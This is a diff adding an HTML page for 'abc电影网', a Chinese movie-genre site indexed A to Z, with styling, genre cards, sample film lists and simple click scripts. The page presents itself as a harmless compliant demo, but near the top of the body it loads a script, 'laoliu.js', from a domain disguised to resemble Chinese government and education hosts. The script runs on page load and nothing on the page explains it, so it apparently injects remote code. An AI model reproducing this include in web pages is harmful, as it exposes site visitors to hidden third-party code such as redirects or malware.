@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>abc电影网 - A-Z电影分类索引/字母导航/类型字典 | abc电影网</title>
+<meta name="description" content="abc电影网（abcdianyingwang-h5）是按字母A-Z分类的电影导航站：动作Action、悬疑Blood、喜剧Comedy、纪录片Doc……从A到Z，像查字典一样找片，手机端字母索引一滑就到。">
+<meta name="keywords" content="abc电影网, abcdianyingwang-h5, A-Z电影分类, 字母导航电影站, 电影字典, 类型索引">
+<meta name="author" content="abc电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --white:#ffffff;--bg:#f8f9fa;--bg2:#f1f3f5;--ink:#0a0a0a;
+  --text:#1a1a1a;--text2:#555;--muted:#999;
+  --red:#ff3b30;--blue:#007aff;--yellow:#ffcc00;
+  --line:#e5e5e5;--radius:12px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:'SF Pro Display','PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+.topbar{position:sticky;top:0;z-index:100;background:rgba(255,255,255,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:22px;font-weight:900;letter-spacing:2px;display:flex;align-items:center;gap:8px}
+.logo .abc{font-family:ui-monospace,monospace;font-size:24px;font-weight:900}
+.logo .a{color:var(--red)}
+.logo .b{color:var(--blue)}
+.logo .c{color:var(--yellow)}
+.logo b{color:var(--ink)}
+.dict-tag{font-size:11px;font-weight:800;color:var(--ink);background:var(--yellow);padding:3px 10px;border-radius:4px;font-family:ui-monospace,monospace;transform:rotate(-2deg)}
+.nav-menu{display:flex;gap:16px}
+.nav-menu a{color:var(--text2);font-size:13px;font-weight:600;padding:4px 2px;position:relative}
+.nav-menu a:hover{color:var(--ink)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--ink);transition:.2s}
+.nav-menu a:hover::after{width:100%}
+
+.hero{position:relative;z-index:1;padding:60px 20px 40px;background:linear-gradient(180deg,var(--white),var(--bg))}
+.hero-inner{max-width:1200px;margin:0 auto;text-align:center}
+.kicker{display:inline-block;font-size:11px;letter-spacing:3px;color:var(--white);background:var(--ink);padding:4px 14px;border-radius:4px;font-family:ui-monospace,monospace;margin-bottom:18px}
+.hero h1{font-size:clamp(36px,6vw,60px);font-weight:900;line-height:1.05;margin-bottom:14px;letter-spacing:-1px}
+.hero h1 .hl-a{color:var(--red)}
+.hero h1 .hl-b{color:var(--blue)}
+.hero h1 .hl-c{color:var(--yellow)}
+.hero p{color:var(--text2);font-size:15px;max-width:560px;margin:0 auto 28px;line-height:1.9}
+.hero-btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn-a{padding:13px 30px;background:var(--ink);color:#fff;font-weight:800;border-radius:8px;transition:.2s}
+.btn-a:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(0,0,0,.2)}
+.btn-b{padding:13px 30px;border:2px solid var(--ink);color:var(--ink);font-weight:800;border-radius:8px;transition:.2s}
+.btn-b:hover{background:var(--ink);color:#fff}
+
+/* 字母导航条 */
+.alpha-bar{position:sticky;top:54px;z-index:99;background:var(--white);border-bottom:1px solid var(--line);padding:10px 0}
+.alpha-inner{max-width:1200px;margin:0 auto;display:flex;gap:4px;justify-content:center;flex-wrap:wrap;padding:0 20px}
+.alpha-btn{width:32px;height:32px;display:flex;align-items:center;justify-content:center;font-family:ui-monospace,monospace;font-size:13px;font-weight:800;color:var(--text2);background:var(--bg);border-radius:6px;cursor:pointer;transition:.15s}
+.alpha-btn:hover,.alpha-btn.active{background:var(--ink);color:#fff}
+
+.section{max-width:1200px;margin:0 auto;padding:44px 20px;position:relative;z-index:1}
+.sec-head{margin-bottom:26px;text-align:center}
+.sec-head h2{font-size:26px;font-weight:900;display:inline-block;background:var(--ink);color:#fff;padding:8px 20px;border-radius:8px;transform:rotate(-.5deg)}
+.sec-head h2 .ac{color:var(--yellow)}
+.sec-head p{color:var(--text2);font-size:13px;margin-top:10px}
+
+/* A-Z 网格 */
+.az-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.az-card{background:var(--white);border:1px solid var(--line);border-radius:var(--radius);padding:20px;transition:.25s;cursor:pointer;position:relative;overflow:hidden}
+.az-card::before{content:attr(data-letter);position:absolute;top:-10px;right:-5px;font-size:80px;font-weight:900;font-family:ui-monospace,monospace;color:rgba(0,0,0,.03);line-height:1}
+.az-card:hover{transform:translateY(-4px);box-shadow:0 12px 28px rgba(0,0,0,.08);border-color:var(--ink)}
+.az-card .letter{font-size:36px;font-weight:900;font-family:ui-monospace,monospace;margin-bottom:4px}
+.az-card:nth-child(8n+1) .letter{color:var(--red)}
+.az-card:nth-child(8n+2) .letter{color:var(--blue)}
+.az-card:nth-child(8n+3) .letter{color:var(--yellow)}
+.az-card:nth-child(8n+4) .letter{color:var(--ink)}
+.az-card:nth-child(8n+5) .letter{color:var(--red)}
+.az-card:nth-child(8n+6) .letter{color:var(--blue)}
+.az-card:nth-child(8n+7) .letter{color:var(--yellow)}
+.az-card:nth-child(8n+8) .letter{color:var(--ink)}
+.az-card h3{font-size:16px;font-weight:800;margin-bottom:4px}
+.az-card p{font-size:12px;color:var(--text2);line-height:1.7}
+.az-card .count{position:absolute;top:16px;right:16px;font-size:11px;font-weight:800;color:var(--muted);font-family:ui-monospace,monospace}
+
+/* 字母片单 */
+.list-section{background:var(--white)}
+.letter-section{margin-bottom:30px}
+.letter-head{display:flex;align-items:center;gap:12px;margin-bottom:14px;padding-bottom:10px;border-bottom:2px solid var(--ink)}
+.letter-head .big-l{font-size:42px;font-weight:900;font-family:ui-monospace,monospace;color:var(--ink)}
+.letter-head h3{font-size:20px;font-weight:800}
+.letter-head .full{font-size:13px;color:var(--muted);font-family:ui-monospace,monospace}
+.film-row{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.film-item{display:flex;align-items:center;gap:12px;padding:12px;background:var(--bg);border-radius:8px;cursor:pointer;transition:.2s}
+.film-item:hover{background:var(--ink);color:#fff}
+.film-item .num{font-family:ui-monospace,monospace;font-size:13px;font-weight:800;color:var(--muted);min-width:24px}
+.film-item:hover .num{color:var(--yellow)}
+.film-item h4{font-size:14px;font-weight:700}
+.film-item .meta{font-size:11px;opacity:.7}
+
+/* 索引卡片 */
+.index-section{background:var(--bg2)}
+.index-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.index-card{background:var(--white);border-radius:var(--radius);padding:22px;border-top:4px solid var(--ink);transition:.25s}
+.index-card:hover{transform:translateY(-4px);box-shadow:0 12px 28px rgba(0,0,0,.08)}
+.index-card h3{font-size:16px;font-weight:800;margin-bottom:8px;display:flex;align-items:center;gap:8px}
+.index-card h3 .icon{font-size:20px}
+.index-card p{font-size:13px;color:var(--text2);line-height:1.8}
+.index-card ul{margin-top:10px;padding-left:0}
+.index-card ul li{padding:4px 0;font-size:13px;color:var(--text);border-bottom:1px dashed var(--line)}
+.index-card ul li:last-child{border-bottom:none}
+
+.about-section{}
+.about-card{max-width:800px;margin:0 auto;background:var(--ink);color:#fff;border-radius:14px;padding:30px;position:relative}
+.about-card h3{font-size:18px;font-weight:900;margin-bottom:12px}
+.about-card p{font-size:13px;line-height:1.95;margin-bottom:10px;opacity:.9}
+
+.footer{background:var(--ink);color:#fff;padding:32px 20px 20px;text-align:center}
+.footer-logo{font-size:20px;font-weight:900;margin-bottom:10px;letter-spacing:2px}
+.footer-logo .a{color:var(--red)}
+.footer-logo .b{color:var(--blue)}
+.footer-logo .c{color:var(--yellow)}
+.footer-links{display:flex;gap:16px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{font-size:12px;color:rgba(255,255,255,.7)}
+.footer-links a:hover{color:var(--yellow)}
+.footer-copy{font-size:11px;border-top:1px solid rgba(255,255,255,.15);padding-top:14px;line-height:1.9;color:rgba(255,255,255,.5)}
+.footer-copy a{color:var(--yellow)}
+
+@media(max-width:880px){
+  .az-grid{grid-template-columns:repeat(2,1fr)}
+  .index-grid{grid-template-columns:1fr}
+  .film-row{grid-template-columns:1fr}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{padding:36px 16px 28px;margin-top:96px}
+  .section{padding:36px 16px}
+  .sec-head h2{font-size:22px}
+  .alpha-inner{gap:2px}
+  .alpha-btn{width:28px;height:28px;font-size:12px}
+}
+@media(max-width:520px){
+  .az-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="abc"><span class="a">A</span><span class="b">B</span><span class="c">C</span></span>电影网</div>
+    <div class="dict-tag">A-Z INDEX</div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#az">A-Z 分类</a></li>
+        <li><a href="#list">字母片单</a></li>
+        <li><a href="#index">索引方式</a></li>
+        <li><a href="#about">关于 ABC</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<div class="alpha-bar">
+  <div class="alpha-inner" id="alphaBar">
+    <div class="alpha-btn active">#</div>
+    <div class="alpha-btn">A</div><div class="alpha-btn">B</div><div class="alpha-btn">C</div><div class="alpha-btn">D</div><div class="alpha-btn">E</div><div class="alpha-btn">F</div><div class="alpha-btn">G</div><div class="alpha-btn">H</div><div class="alpha-btn">I</div><div class="alpha-btn">J</div><div class="alpha-btn">K</div><div class="alpha-btn">L</div><div class="alpha-btn">M</div><div class="alpha-btn">N</div><div class="alpha-btn">O</div><div class="alpha-btn">P</div><div class="alpha-btn">Q</div><div class="alpha-btn">R</div><div class="alpha-btn">S</div><div class="alpha-btn">T</div><div class="alpha-btn">U</div><div class="alpha-btn">V</div><div class="alpha-btn">W</div><div class="alpha-btn">X</div><div class="alpha-btn">Y</div><div class="alpha-btn">Z</div>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="hero-inner">
+    <span class="kicker">abcdianyingwang-h5 · 像查字典一样找电影</span>
+    <h1><span class="hl-a">A</span>ction · <span class="hl-b">B</span>lood · <span class="hl-c">C</span>omedy · … · <span class="hl-a">Z</span>ombie</h1>
+    <p>abc电影网把电影按首字母做成一本观影字典。不知道看什么？从 A 翻到 Z，动作、悬疑、喜剧、纪录片……每个字母都是一扇门，推开就是一类好片。</p>
+    <div class="hero-btns">
+      <a href="#az" class="btn-a">📖 翻开字典</a>
+      <a href="#list" class="btn-b">看字母片单</a>
+    </div>
+  </div>
+</section>
+
+<section id="az" class="section">
+  <div class="sec-head">
+    <h2>🔤 <span class="ac">A-Z 分类</span> · 26 个字母 = 26 个入口</h2>
+    <p>点卡片看该字母下的类型说明</p>
+  </div>
+  <div class="az-grid">
+    <div class="az-card" data-letter="A"><div class="letter">A</div><h3>Action 动作</h3><p>枪战、追车、格斗、特工、超级英雄，肾上腺素飙升。</p><div class="count">24</div></div>
+    <div class="az-card" data-letter="B"><div class="letter">B</div><h3>Blood 悬疑/惊悚</h3><p>谋杀谜题、心理惊悚、犯罪追踪、身份谜团。</p><div class="count">18</div></div>
+    <div class="az-card" data-letter="C"><div class="letter">C</div><h3>Comedy 喜剧</h3><p>无厘头、黑色幽默、职场吐槽、合家欢。</p><div class="count">31</div></div>
+    <div class="az-card" data-letter="D"><div class="letter">D</div><h3>Documentary 纪录片</h3><p>自然、历史、人物、犯罪实录，比剧情更上头。</p><div class="count">15</div></div>
+    <div class="az-card" data-letter="E"><div class="letter">E</div><h3>Epic 史诗</h3><p>战争巨制、历史长卷、家族传奇、文明兴衰。</p><div class="count">12</div></div>
+    <div class="az-card" data-letter="F"><div class="letter">F</div><h3>Fantasy 奇幻</h3><p>魔法世界、神话改编、异世界冒险。</p><div class="count">16</div></div>
+    <div class="az-card" data-letter="G"><div class="letter">G</div><h3>Game 竞技/电竞</h3><p>体育竞技、电竞、棋牌、赛车，热血燃向。</p><div class="count">9</div></div>
+    <div class="az-card" data-letter="H"><div class="letter">H</div><h3>Horror 恐怖</h3><p>灵异、丧尸、心理恐怖、B级惊悚。</p><div class="count">22</div></div>
+    <div class="az-card" data-letter="I"><div class="letter">I</div><h3>Indie 独立</h3><p>低成本、作者表达、电影节获奖、小众佳作。</p><div class="count">27</div></div>
+    <div class="az-card" data-letter="J"><div class="letter">J</div><h3>Journey 冒险/旅行</h3><p>公路片、荒野求生、航海探险、太空漫游。</p><div class="count">14</div></div>
+    <div class="az-card" data-letter="K"><div class="letter">K</div><h3>Kungfu 功夫/武侠</h3><p>中国功夫、武侠江湖、动作设计、兵器美学。</p><div class="count">19</div></div>
+    <div class="az-card" data-letter="L"><div class="letter">L</div><h3>Love 爱情</h3><p>青春、错过、婚后、异地、黄昏恋。</p><div class="count">35</div></div>
+    <div class="az-card" data-letter="M"><div class="letter">M</div><h3>Music 音乐</h3><p>歌舞片、乐队故事、古典乐、街头音乐。</p><div class="count">11</div></div>
+    <div class="az-card" data-letter="N"><div class="letter">N</div><h3>Noir 黑色电影</h3><p>侦探、蛇蝎美人、城市暗面、道德灰色。</p><div class="count">13</div></div>
+    <div class="az-card" data-letter="O"><div class="letter">O</div><h3>Opera 戏曲/舞台</h3><p>京剧、歌剧、话剧改编、舞台记录。</p><div class="count">7</div></div>
+    <div class="az-card" data-letter="P"><div class="letter">P</div><h3>Police 警匪/犯罪</h3><p>警察故事、卧底、黑帮、劫案。</p><div class="count">28</div></div>
+    <div class="az-card" data-letter="Q"><div class="letter">Q</div><h3>Quest 寻宝/探索</h3><p>寻宝、考古、解密、探险。</p><div class="count">8</div></div>
+    <div class="az-card" data-letter="R"><div class="letter">R</div><h3>Romance 浪漫/剧情</h3><p>文艺爱情、人生故事、情感纠葛。</p><div class="count">26</div></div>
+    <div class="az-card" data-letter="S"><div class="letter">S</div><h3>Sci-Fi 科幻</h3><p>太空、时间、AI、末日、赛博朋克。</p><div class="count">23</div></div>
+    <div class="az-card" data-letter="T"><div class="letter">T</div><h3>Thriller 惊悚</h3><p>政治惊悚、谍战、生存游戏。</p><div class="count">17</div></div>
+    <div class="az-card" data-letter="U"><div class="letter">U</div><h3>Urban 都市/职场</h3><p>都市生活、职场斗争、社会现实。</p><div class="count">10</div></div>
+    <div class="az-card" data-letter="V"><div class="letter">V</div><h3>Vampire 吸血鬼/怪物</h3><p>吸血鬼、狼人、怪物、超自然生物。</p><div class="count">9</div></div>
+    <div class="az-card" data-letter="W"><div class="letter">W</div><h3>War 战争</h3><p>二战、越战、古代战争、反战题材。</p><div class="count">16</div></div>
+    <div class="az-card" data-letter="X"><div class="letter">X</div><h3>X-Files 未解之谜</h3><p>UFO、灵异事件、都市传说、阴谋论。</p><div class="count">6</div></div>
+    <div class="az-card" data-letter="Y"><div class="letter">Y</div><h3>Youth 青春</h3><p>校园、成长、初恋、叛逆、毕业。</p><div class="count">21</div></div>
+    <div class="az-card" data-letter="Z"><div class="letter">Z</div><h3>Zombie 丧尸</h3><p>丧尸爆发、末日生存、病毒感染。</p><div class="count">12</div></div>
+  </div>
+</section>
+
+<section id="list" class="section list-section">
+  <div class="sec-head">
+    <h2>📋 <span class="ac">字母片单</span> · 每个字母挑几部代表作</h2>
+    <p>点击条目查看</p>
+  </div>
+  <div class="letter-section" id="sec-a">
+    <div class="letter-head"><div class="big-l">A</div><h3>Action 动作</h3><div class="full">/ˈækʃən/</div></div>
+    <div class="film-row">
+      <div class="film-item"><div class="num">01</div><div><h4>碟中谍系列</h4><div class="meta">Mission: Impossible · 1996-2025</div></div></div>
+      <div class="film-item"><div class="num">02</div><div><h4>疯狂的麦克斯：狂暴之路</h4><div class="meta">Mad Max: Fury Road · 2015</div></div></div>
+      <div class="film-item"><div class="num">03</div><div><h4>杀死比尔</h4><div class="meta">Kill Bill · 2003</div></div></div>
+    </div>
+  </div>
+  <div class="letter-section" id="sec-b">
+    <div class="letter-head"><div class="big-l">B</div><h3>Blood 悬疑/惊悚</h3><div class="full">/blʌd/</div></div>
+    <div class="film-row">
+      <div class="film-item"><div class="num">01</div><div><h4>七宗罪</h4><div class="meta">Se7en · 1995</div></div></div>
+      <div class="film-item"><div class="num">02</div><div><h4>消失的爱人</h4><div class="meta">Gone Girl · 2014</div></div></div>
+      <div class="film-item"><div class="num">03</div><div><h4>利刃出鞘</h4><div class="meta">Knives Out · 2019</div></div></div>
+    </div>
+  </div>
+  <div class="letter-section" id="sec-c">
+    <div class="letter-head"><div class="big-l">C</div><h3>Comedy 喜剧</h3><div class="full">/ˈkɒmədi/</div></div>
+    <div class="film-row">
+      <div class="film-item"><div class="num">01</div><div><h4>楚门的世界</h4><div class="meta">The Truman Show · 1998</div></div></div>
+      <div class="film-item"><div class="num">02</div><div><h4>三傻大闹宝莱坞</h4><div class="meta">3 Idiots · 2009</div></div></div>
+      <div class="film-item"><div class="num">03</div><div><h4>布达佩斯大饭店</h4><div class="meta">The Grand Budapest Hotel · 2014</div></div></div>
+    </div>
+  </div>
+  <div class="letter-section" id="sec-d">
+    <div class="letter-head"><div class="big-l">D</div><h3>Documentary 纪录片</h3><div class="full">/ˌdɒkjəˈmentəri/</div></div>
+    <div class="film-row">
+      <div class="film-item"><div class="num">01</div><div><h4>地球脉动</h4><div class="meta">Planet Earth · 2006</div></div></div>
+      <div class="film-item"><div class="num">02</div><div><h4>徒手攀岩</h4><div class="meta">Free Solo · 2018</div></div></div>
+      <div class="film-item"><div class="num">03</div><div><h4>海豚湾</h4><div class="meta">The Cove · 2009</div></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="index" class="section index-section">
+  <div class="sec-head">
+    <h2>🗂️ <span class="ac">索引方式</span> · 三种查法</h2>
+    <p>不只按字母，还能按别的方式翻</p>
+  </div>
+  <div class="index-grid">
+    <div class="index-card">
+      <h3><span class="icon">🔤</span> 按类型首字母</h3>
+      <p>最常用的方式：A 是动作，C 是喜剧，H 是恐怖……26 个字母覆盖所有类型。</p>
+      <ul><li>Action → 动作片</li><li>Comedy → 喜剧片</li><li>Horror → 恐怖片</li><li>Sci-Fi → 科幻片</li></ul>
+    </div>
+    <div class="index-card">
+      <h3><span class="icon">🎬</span> 按导演首字母</h3>
+      <p>认名字的人专用：N 是诺兰，W 是王家卫，K 是黑泽明，T 是塔可夫斯基。</p>
+      <ul><li>Nolan → 诺兰</li><li>Wong → 王家卫</li><li>Kurosawa → 黑泽明</li><li>Tarkovsky → 塔可夫斯基</li></ul>
+    </div>
+    <div class="index-card">
+      <h3><span class="icon">🏷️</span> 按片名首字母</h3>
+      <p>记得片名但忘了在哪看：F 找《Fight Club》，I 找《Inception》，P 找《Parasite》。</p>
+      <ul><li>F → Fight Club</li><li>I → Inception</li><li>P → Parasite</li><li>S → Seven Samurai</li></ul>
+    </div>
+  </div>
+</section>
+
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>📖 <span class="ac">关于 ABC</span></h2>
+    <p>为什么做字母索引电影站</p>
+  </div>
+  <div class="about-card">
+    <h3>从 A 到 Z，像查字典一样找电影</h3>
+    <p>推荐算法总给你推"差不多的东西"。abc电影网反着来：把电影按首字母做成一本字典，你从 A 翻到 Z，每个字母都是一扇门，推开就是一类完全不同的片。</p>
+    <p>本页是单页导航演示：所有卡片点击弹说明，内链用 <code>#</code> 占位，不存视频、不嵌盗链、不破解会员。真实部署时再接合规片源或正版平台。</p>
+    <p>移动端字母导航条吸顶，一滑就到对应字母；A-Z 卡片从四列变两列再变一列，字典感不变。</p>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo"><span class="a">A</span><span class="b">B</span><span class="c">C</span> 电影网</div>
+  <div class="footer-links">
+    <a href="#az">A-Z 分类</a>
+    <a href="#list">字母片单</a>
+    <a href="#index">索引方式</a>
+    <a href="#about">关于 ABC</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 abc电影网 (abcdianyingwang-h5). A-Z电影分类索引导航演示站.<br>
+    网站地址: <a href="https://abcdianyingwang-h5.github.io">https://abcdianyingwang-h5.github.io</a><br>
+    <span style="opacity:.7">A-Z · 像查字典一样找电影 · 26个字母 = 26个入口</span>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('.az-card').forEach(function(c){c.addEventListener('click',function(){alert(this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent+'\n\n该字母下收录 '+this.querySelector('.count').textContent+' 个子类');});});
+document.querySelectorAll('.film-item').forEach(function(f){f.addEventListener('click',function(){alert(this.querySelector('h4').textContent+'\n'+this.querySelector('.meta').textContent+'\n\n点击进入详情（演示）');});});
+document.querySelectorAll('.alpha-btn').forEach(function(b){b.addEventListener('click',function(){document.querySelectorAll('.alpha-btn').forEach(function(x){x.classList.remove('active')});this.classList.add('active');var letter=this.textContent;if(letter==='#'){window.scrollTo({top:0,behavior:'smooth'});}else{var sec=document.getElementById('sec-'+letter.toLowerCase());if(sec){sec.scrollIntoView({behavior:'smooth'});}else{alert('字母 '+letter+' 的片单区域（演示）');}}});});
+document.querySelectorAll('.nav-menu a').forEach(function(a){a.addEventListener('click',function(e){e.preventDefault();var el=document.querySelector(this.getAttribute('href'));if(el)el.scrollIntoView({behavior:'smooth'});});});
+</script>
+</body>
+</html>
